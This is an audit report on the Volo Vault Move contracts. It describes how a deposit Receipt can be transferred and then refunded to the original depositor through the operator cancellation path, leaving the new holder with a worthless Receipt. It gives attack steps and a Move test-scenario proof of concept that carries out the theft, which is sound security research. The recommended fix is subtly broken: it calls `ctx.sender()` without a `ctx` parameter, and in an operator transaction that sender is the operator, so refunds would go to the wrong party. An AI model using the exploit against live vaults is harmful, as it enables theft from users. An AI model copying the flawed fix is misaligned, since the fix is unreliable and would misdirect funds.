# Audit Report

## Title
Receipt Transfer Enables Deposit Fund Theft Through Operator Cancellation Path

## Summary
The operator-initiated deposit cancellation path validates the stored recipient address from deposit creation time but fails to verify current Receipt ownership. This TOCTOU vulnerability allows an attacker to transfer their Receipt, then have an operator cancel the deposit to reclaim buffered funds while the new Receipt holder is left with a worthless Receipt.

## Finding Description

The Volo Vault system implements two distinct deposit cancellation paths with critically different security models:

**User-Initiated Path**: The user cancellation function requires the caller to possess the Receipt object and uses the transaction sender as the recipient, ensuring only the current Receipt holder can cancel. [1](#0-0) 

**Operator-Initiated Path**: The operator cancellation function accepts only address parameters without requiring the Receipt object itself. [2](#0-1) 

The vulnerability arises from three design decisions:

1. **Receipt Transferability**: The Receipt struct has both `key` and `store` abilities, making it fully transferable via `transfer::public_transfer`. [3](#0-2) 

2. **Stale Recipient Storage**: When a user creates a deposit request, the transaction sender is captured as the recipient and permanently stored in the DepositRequest. [4](#0-3) 

3. **Insufficient Ownership Validation**: The core cancellation function only validates that the provided recipient parameter matches the stored recipient from the DepositRequest, without verifying that the Receipt is currently owned by that address. [5](#0-4) 

The buffered coins are then transferred to the validated recipient. [6](#0-5) 

The Receipt's pending_deposit_balance is correctly decremented, but this offers no protection to the current holder who now owns a Receipt with zero underlying value. [7](#0-6) 

**Attack Execution**:
1. Alice calls `user_entry::deposit`, creating a DepositRequest with recipient = Alice's address
2. Alice transfers the Receipt to Bob using `transfer::public_transfer`
3. Alice submits an off-chain cancellation request to the operator with her signature
4. Operator calls `operation::cancel_user_deposit` with Alice's address as recipient
5. Validation passes because the stored recipient equals the provided recipient (both Alice)
6. Buffered coins are transferred to Alice
7. Bob holds a Receipt with pending_deposit_balance decremented to zero

## Impact Explanation

This vulnerability enables direct theft of user funds through a straightforward attack:

**Attacker Gain**: X (recovered deposit) + Y (payment from victim for Receipt transfer) - gas fees
**Victim Loss**: Y (amount paid for Receipt with no underlying value)
**Protocol Impact**: Reputation damage and loss of trust in Receipt transferability

The attack is particularly damaging because:
- It exploits a legitimate protocol feature (Receipt transferability with `store` ability)
- The operator acts honestly and follows proper verification procedures
- Any user who acquires a Receipt with pending deposits through transfer, sale, or as collateral becomes vulnerable
- The VaultReceiptInfo is correctly updated, masking the theft until the victim attempts to use the Receipt

## Likelihood Explanation

This vulnerability has high likelihood of exploitation:

**No Malicious Operator Required**: The operator doesn't need to be compromised. Following standard operational procedures, the operator would:
- Verify the cancellation request is cryptographically signed by the stored recipient address
- Check that the locking period has elapsed (5 minutes default)
- Execute the cancellation as requested

The protocol provides no mechanism for the operator to detect that the Receipt has been transferred.

**Economic Rationality**: The attack becomes profitable whenever Receipts can be transferred for value, which occurs in:
- Secondary market trading of vault positions
- Using Receipts as collateral in lending protocols  
- OTC sales of deposit positions
- Any scenario where Receipt ownership changes hands

**Accessibility**: All required functions are public entry points accessible to regular users. The only privileged capability required is OperatorCap, which is a trusted role expected to process legitimate cancellation requests.

## Recommendation

Add current Receipt ownership verification to the operator cancellation path. One approach:

```move
public fun cancel_user_deposit<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    request_id: u64,
    receipt: &Receipt,  // Require Receipt object
    clock: &Clock,
) {
    vault::assert_operator_not_freezed(operation, cap);
    let receipt_id = receipt.receipt_id();
    let buffered_coin = vault.cancel_deposit(
        clock, 
        request_id, 
        receipt_id, 
        ctx.sender()  // Use current transaction sender
    );
    transfer::public_transfer(buffered_coin, ctx.sender());
}
```

This ensures the current Receipt holder must possess the Receipt object to cancel, aligning the operator path with the user path security model.

Alternatively, disable operator-initiated cancellation entirely and require all users to cancel through the user_entry path which has proper ownership validation.

## Proof of Concept

```move
#[test]
// POC: Receipt transfer enables deposit theft via operator cancellation
fun test_receipt_transfer_theft() {
    let mut scenario = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup vault
    init_vault::init_vault(&mut scenario, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut scenario);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut scenario);
    
    // Alice deposits 1000 SUI
    scenario.next_tx(ALICE);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, scenario.ctx());
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = scenario.take_shared<RewardManager<SUI_TEST_COIN>>();
        
        let (_request_id, receipt, coin) = user_entry::deposit(
            &mut vault, &mut reward_manager, coin, 1_000_000_000,
            2_000_000_000, option::none(), &clock, scenario.ctx()
        );
        
        transfer::public_transfer(coin, ALICE);
        transfer::public_transfer(receipt, ALICE);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };
    
    // Alice transfers Receipt to Bob
    scenario.next_tx(ALICE);
    {
        let receipt = scenario.take_from_sender<Receipt>();
        transfer::public_transfer(receipt, BOB);
    };
    
    // Advance time past locking period
    clock.increment_for_testing(6 * 60 * 1000);
    
    // Operator cancels deposit, sending funds to Alice (stored recipient)
    scenario.next_tx(OWNER);
    {
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let receipt = scenario.take_from_address<Receipt>(BOB);
        let operation = scenario.take_shared<Operation>();
        let operator_cap = scenario.take_from_sender<OperatorCap>();
        
        operation::cancel_user_deposit<SUI_TEST_COIN>(
            &operation, &operator_cap, &mut vault,
            0, receipt.receipt_id(), ALICE, &clock
        );
        
        test_scenario::return_shared(vault);
        scenario.return_to_address(BOB, receipt);
        test_scenario::return_shared(operation);
        scenario.return_to_sender(operator_cap);
    };
    
    // Verify: Alice received the refund
    scenario.next_tx(ALICE);
    {
        let coin = scenario.take_from_sender<Coin<SUI_TEST_COIN>>();
        assert!(coin.value() == 1_000_000_000); // Alice got funds back
        scenario.return_to_sender(coin);
    };
    
    // Verify: Bob's Receipt has zero pending deposit balance
    scenario.next_tx(BOB);
    {
        let vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let receipt = scenario.take_from_sender<Receipt>();
        let receipt_info = vault.vault_receipt_info(receipt.receipt_id());
        
        assert!(receipt_info.pending_deposit_balance() == 0); // Bob's Receipt is worthless
        
        test_scenario::return_shared(vault);
        scenario.return_to_sender(receipt);
    };
    
    clock.destroy_for_testing();
    scenario.end();
}
```

### Citations

**File:** volo-vault/sources/user_entry.move (L52-58)
```text
    let request_id = vault.request_deposit(
        split_coin,
        clock,
        expected_shares,
        receipt_id,
        ctx.sender(),
    );
```

**File:** volo-vault/sources/user_entry.move (L91-103)
```text
public fun cancel_deposit<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    receipt: &mut Receipt,
    request_id: u64,
    clock: &Clock,
    ctx: &mut TxContext,
): Coin<PrincipalCoinType> {
    vault.assert_vault_receipt_matched(receipt);

    let coin = vault.cancel_deposit(clock, request_id, receipt.receipt_id(), ctx.sender());

    coin
}
```

**File:** volo-vault/sources/operation.move (L435-447)
```text
public fun cancel_user_deposit<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    request_id: u64,
    receipt_id: address,
    recipient: address,
    clock: &Clock,
) {
    vault::assert_operator_not_freezed(operation, cap);
    let buffered_coin = vault.cancel_deposit(clock, request_id, receipt_id, recipient);
    transfer::public_transfer(buffered_coin, recipient);
}
```

**File:** volo-vault/sources/receipt.move (L12-15)
```text
public struct Receipt has key, store {
    id: UID,
    vault_id: address, // This receipt belongs to which vault
}
```

**File:** volo-vault/sources/volo_vault.move (L777-783)
```text
    let deposit_request = &mut self.request_buffer.deposit_requests[request_id];
    assert!(receipt_id == deposit_request.receipt_id(), ERR_RECEIPT_ID_MISMATCH);
    assert!(
        deposit_request.request_time() + self.locking_time_for_cancel_request <= clock.timestamp_ms(),
        ERR_REQUEST_CANCEL_TIME_NOT_REACHED,
    );
    assert!(deposit_request.recipient() == recipient, ERR_RECIPIENT_MISMATCH);
```

**File:** volo-vault/sources/volo_vault.move (L789-801)
```text
    let coin = self.request_buffer.deposit_coin_buffer.remove(request_id);

    emit(DepositCancelled {
        request_id: request_id,
        receipt_id: deposit_request.receipt_id(),
        recipient: recipient,
        vault_id: self.id.to_address(),
        amount: deposit_request.amount(),
    });

    self.delete_deposit_request(request_id);

    coin
```

**File:** volo-vault/sources/vault_receipt_info.move (L57-63)
```text
public(package) fun update_after_cancel_deposit(
    self: &mut VaultReceiptInfo,
    cancelled_deposit_balance: u64,
) {
    self.status = NORMAL_STATUS;
    self.pending_deposit_balance = self.pending_deposit_balance - cancelled_deposit_balance;
}
```
